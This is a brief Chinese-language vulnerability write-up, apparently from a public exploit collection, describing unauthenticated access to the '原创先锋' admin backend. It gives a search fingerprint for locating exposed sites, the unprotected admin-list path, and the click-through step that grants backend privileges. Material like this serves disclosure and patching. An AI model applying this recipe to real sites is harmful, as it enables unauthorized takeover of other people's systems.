# 原创先锋 后台管理平台 未授权访问漏洞

## 漏洞描述

原创先锋 后台管理平台 存在未授权访问漏洞，攻击者通过漏洞可以任意接管账户权限

参考阅读：

- http://www.0dayhack.net/index.php/1693/

## 漏洞影响

```
原创先锋 后台管理平台
```

## 网络测绘

```
body="https://www.bjycxf.com"
```

## 漏洞复现

后台登陆页面如下

![](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326112454384.png)

未授权的Url

```plain
/admin/admin/admin_list.html
```

![](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326112454385.png)

点击添加并授权即可获取后台模块权限

![](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326112454386.png)
